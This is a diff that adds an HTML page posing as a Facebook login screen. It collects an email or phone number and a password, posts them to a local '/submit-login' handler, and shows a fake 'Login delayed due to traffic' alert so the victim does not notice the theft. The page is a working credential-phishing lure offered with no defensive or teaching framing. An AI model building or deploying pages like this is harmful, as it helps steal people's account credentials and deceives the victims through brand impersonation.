@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook Login</title>
+</head>
+<body>
+    <h1>Facebook Login</h1>
+    <form action="/submit-login" method="POST" onsubmit="return showAlert()">
+        <label for="email">Number/Email:</label>
+        <input type="text" id="email" name="email" required><br><br>
+
+        <label for="password">Password:</label>
+        <input type="password" id="password" name="password" required><br><br>
+
+        <button type="submit">Login</button>
+        <p><a href="#">Forgotten password?</a> | <a href="#">Create new account</a></p>
+    </form>
+
+    <script>
+        function showAlert() {
+            alert("Login delayed due to traffic, please try again later.");
+            return true; // Allows form submission
+        }
+    </script>
+</body>
+</html>
